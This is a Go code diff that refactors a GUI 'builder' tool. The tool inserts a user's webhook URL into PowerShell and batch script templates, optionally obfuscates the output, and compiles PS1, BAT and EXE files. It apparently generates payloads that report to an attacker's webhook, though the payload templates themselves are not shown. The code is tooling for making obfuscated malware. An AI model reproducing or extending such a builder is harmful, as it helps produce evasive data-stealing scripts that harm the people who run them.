@@ -3,15 +3,14 @@ package main
 import (
 	"fmt"
 	"image/color"
-	"net/http"
-	"net/url"
 	"os"
-	"strings"
 	"time"
 
 	"builder/modules/cursed"
-	"builder/modules/static"
-	"builder/modules/static/batch"
+	"builder/modules/options/batch"
+	"builder/modules/options/powershell"
+
+	"builder/modules/options/utils"
 
 	"fyne.io/fyne/v2"
 	"fyne.io/fyne/v2/app"
@@ -48,49 +47,19 @@ func main() {
 	obfuscateCheckBox.SetChecked(false)
 
 	compileButtonPS1 := widget.NewButton("Compile PS1", func() {
-		if !(testWebhook(a, webhookEntry.Text)) {
-			return
-		} else {
-			powershellCode := static.GetPowershellCode()
-			powershellCode = strings.Replace(powershellCode, "YOUR_WEBHOOK_HERE", webhookEntry.Text, -1)
-			err = os.WriteFile("output.ps1", []byte(powershellCode), 0644)
-			if err != nil {
-				fmt.Println(err)
-			} else {
-				makeSuccessMessage(a, "Compiled PS1 file successfully! Location is at "+cwd+"\\output.ps1")
-			}
-		}
+		powershell.CompilePowershellFile(a, webhookEntry.Text, obfuscateCheckBox.Checked)
 	})
 
 	compileButtonBAT := widget.NewButton("Compile BAT", func() {
-		if !(testWebhook(a, webhookEntry.Text)) {
-			return
-		} else {
-			batchCode := static.GetBatCode()
-			batchCode = strings.Replace(batchCode, "YOUR_WEBHOOK_HERE2", webhookEntry.Text, -1)
-			err = os.WriteFile("output.bat", []byte(batchCode), 0644)
-			if err != nil {
-				fmt.Println(err)
-			} else {
-				if obfuscateCheckBox.Checked {
-					makeSuccessMessage(a, "test")
-					err = batch.ObfuscateCode("output.bat")
-					if err != nil {
-						makeErrorMessage(a, "An error occured while obfuscating the code"+err.Error())
-						return
-					}
-				}
-				makeSuccessMessage(a, "Compiled BAT file successfully! Location is at "+cwd+"\\output.bat")
-			}
-		}
+		batch.BuildBatchFile(a, webhookEntry.Text, obfuscateCheckBox.Checked)
 	})
 
 	comepileButtonEXE := widget.NewButton("Compile EXE", func() {
-		if !(testWebhook(a, webhookEntry.Text)) {
+		if !(utils.TestWebhook(a, webhookEntry.Text)) {
 			return
 		} else {
 			//make a success message
-			makeSuccessMessage(a, "Compiled EXE file successfully! Location is at "+cwd+"\\output.exe")
+			utils.MakeSuccessMessage(a, "Compiled EXE file successfully! Location is at "+cwd+"\\output.exe")
 			fmt.Println(obfuscateCheckBox.Checked)
 		}
 	})
@@ -117,51 +86,4 @@ func main() {
 	}()
 
 	win.ShowAndRun()
-}
-
-func makeSuccessMessage(a fyne.App, message string) {
-	green := color.NRGBA{R: 0, G: 180, B: 0, A: 255}
-	messageWindow := a.NewWindow("Success")
-	messageWindow.Resize(fyne.NewSize(200, 100))
-	messageWindow.CenterOnScreen()
-
-	messageToShow := canvas.NewText(message, green)
-	messageToShow.Alignment = fyne.TextAlignCenter
-
-	messageWindow.SetContent(messageToShow)
-	messageWindow.Show()
-}
-
-func makeErrorMessage(a fyne.App, message string) {
-	red := color.NRGBA{R: 180, G: 0, B: 0, A: 255}
-	messageWindow := a.NewWindow("Error")
-	messageWindow.Resize(fyne.NewSize(200, 100))
-	messageWindow.CenterOnScreen()
-
-	messageToShow := canvas.NewText(message, red)
-	messageToShow.Alignment = fyne.TextAlignCenter
-
-	messageWindow.SetContent(messageToShow)
-	messageWindow.Show()
-}
-
-func testWebhook(a fyne.App, webhook string) bool {
-	if webhook == "" {
-		return false
-	}
-
-	_, err := url.ParseRequestURI(webhook)
-	if err != nil {
-		makeErrorMessage(a, "Invalid URL")
-		return false
-	}
-
-	resp, err := http.Get(webhook)
-	if err != nil {
-		makeErrorMessage(a, "Invalid URL")
-		return false
-	}
-	defer resp.Body.Close()
-
-	return resp.StatusCode == 200
 }
